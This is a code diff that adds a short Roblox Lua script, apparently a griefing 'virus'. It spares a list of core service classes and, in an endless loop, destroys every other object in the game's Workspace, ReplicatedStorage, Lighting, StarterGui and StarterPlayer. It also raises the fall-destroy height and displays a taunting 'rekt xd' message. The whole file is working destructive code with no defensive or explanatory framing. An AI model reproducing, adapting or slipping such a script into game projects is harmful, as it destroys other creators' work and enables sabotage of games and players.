@@ -1,0 +1,50 @@
+--RBC 3/20/2018
+
+local ignore = {
+["Workspace"] = true,
+["Terrain"] = true,
+["ReplicatedStorage"] = true,
+["StarterGui"] = true,
+["StarterPlayer"] = true,
+["game"] = true,
+["Camera"] = true,
+["Game"] = true,
+["Lighting"] = true,
+["StarterCharacterScripts"] = true,
+["Message"] = true,
+--["Map"] = true,
+["StarterPlayerScripts"] = true;
+}
+
+function recurse(obj)
+if not ignore[obj.ClassName] then
+	--if obj.Name ~= "Map" then
+	obj:Destroy()
+	wait()
+	--end
+end
+
+local children = obj:GetChildren()
+if #children >= 1 then
+
+
+
+	local childs = obj:GetChildren()
+	for i = 1,#childs do
+		recurse(childs[i])
+	end
+end
+end
+
+local m = Instance.new("Message",game.Workspace)
+m.Name = "fuckoff"
+m.Text = "rekt xd"
+
+game.Workspace.FallenPartsDestroyHeight = 500
+while wait() do
+recurse(game.Workspace)
+recurse(game.ReplicatedStorage)
+recurse(game.Lighting)
+recurse(game.StarterGui)
+recurse(game.StarterPlayer)
+end
